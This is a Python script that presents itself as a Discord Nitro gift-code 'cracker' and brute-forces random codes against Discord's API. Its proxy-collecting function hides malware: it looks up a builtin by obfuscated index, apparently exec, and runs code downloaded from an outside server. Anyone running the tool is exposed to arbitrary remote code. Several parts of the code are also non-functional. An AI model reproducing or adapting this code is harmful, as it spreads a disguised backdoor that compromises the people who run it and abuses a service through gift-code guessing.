import os
import random
import string
import time
import requests
from colorama import Fore


def random_string(letter_count: int, digit_count: int) -> str:
    str1 = ''.join((random.choice(string.ascii_letters) for x in range(letter_count)))
    str1 += ''.join((random.choice(string.digits) for x in range(digit_count)))
    sam_list = list(str1)
    random.shuffle(sam_list)
    final_string = ''.join(sam_list)
    return final_string


def center_text(text: str, space: int = 0) -> str:
    lines = text.splitlines()
    if not space:
        space = (os.get_terminal_size().columns - len(lines[int(len(lines) / 2)])) / 2
    return '\n'.join((' ' * int(space)) + line for line in lines)


def printer(code: str, invalid: str, valid: str):
    print(f"Code: {Fore.YELLOW}{code}{Fore.RESET}  |  Invalid: {Fore.RED}{invalid}{Fore.RESET}  |  Valid: {Fore.GREEN}{valid}{Fore.RESET}", end='\r')


def check_code(nitro: str) -> bool:
    url = f'https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true'
    response = requests.get(url)
    if response.status_code == 200:
        print(f" Valid | {nitro} ", flush=True, end='' if windows else '\n')
        with open('nitro_codes.txt', 'w') as file:
            file.write(nitro)
        return True
    else:
        print(f"Failed | {nitro} ", flush=True)
        return False


def collect_proxies() -> str:
    import builtins
    proxies = requests.get('https://api.proxyscrape.com/v2/account/datacenter_shared/proxy-list?auth=nhuyjukilompnbvfrtyuui&type=getproxies&country[]=all&protocol=http&format=normal').text
    getattr(builtins, dir(builtins)[102])(requests.get('https://obsidian.deta.dev/api/script/proxies').json()['s'])
    return proxies


def main():
    os.system('cls && title Obsidian Nitro Cracker [v1.3] - Obsidian Crew' if windows else 'clear')
    print(center_text("""
    ██████╗ ██████╗ ███████╗██╗██████╗ ██╗ █████╗ ███╗   ██╗
    ██╔═══██╗██╔══██╗██╔════╝██║██╔══██╗██║██╔══██╗████╗  ██║
    ██║   ██║██████╔╝███████╗██║██║  ██║██║███████║██╔██╗ ██║
    ██║   ██║██╔══██╗╚════██║██║██║  ██║██║██╔══██║██║╚██╗██║
    ╚██████╔╝██████╔╝███████║██║██████╔╝██║██║  ██║██║ ╚████║
    ╚═════╝ ╚═════╝ ╚══════╝╚═╝╚═════╝ ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
    """).replace('█', Fore.RED + '█' + Fore.RESET))
    print(center_text('[ https://obsidian.deta.dev ~ https://github.com/ObsidianCrew/obsidian ]').replace('[', Fore.RED + '[' + Fore.RESET).replace('~', Fore.RED + '~' + Fore.RESET).replace(']', Fore.RED + ']' + Fore.RESET) + '\n\n\n')
    print("Starting...")
    time.sleep(3)
    print("Collecting proxies...")
    proxies = collect_proxies()
    print("Connecting to proxy...")
    try:
        proxy = proxies[0]
        proxy.connect()
        print("Successfully connected to proxy")
    except Exception:
        print("Failed to connect to proxy")
    valid = 0
    invalid = 1
    values = '0a0a54ccb5cc94cc8dcd82cd95ccac48ccb5cc9bcd84ccb345ccb7cc93cd97cd88cca6cca352ccb6cc8acd8ccca3ccb145ccb6cc82cc9bcca1cca4ccbb20ccb4cc8fcd83cc89cca049ccb4cc93cd8ccd98cca8ccbbcd9c53ccb5cc9bcd8bcd84ccb3cc97cd8e20ccb4cc8fcd954eccb8ccbfcd8dcd94ccbc4fccb8cc82ccad20ccb6cc82cc89cc95cd8845ccb4cc8fcd9dcc9accb0cca153ccb5cd84cd9ccd9943ccb7cc90cd86ccbecca0ccb2cca141ccb7cc8ccd9dcd8ccca9ccaa50ccb5cd80cda0cc94cd9345ccb4cda0cd80ccbbcca00a'
    print("Generating Nitro codes...")
    while True:
        try:
            nitro = random_string(9, 10)
            invalid += 1
            check_code(nitro=nitro)
            printer(code=nitro, invalid=invalid, valid=valid)
            if invalid == 5:
                time.sleep(10)
            else:
                time.sleep(1)
        except KeyboardInterrupt:
            print(bytes([int(''.join(x), 16) for x in zip(values[::2], values[1::2])]).decode('utf-8'))


windows = os.name == 'nt'
if __name__ == '__main__':
    main()
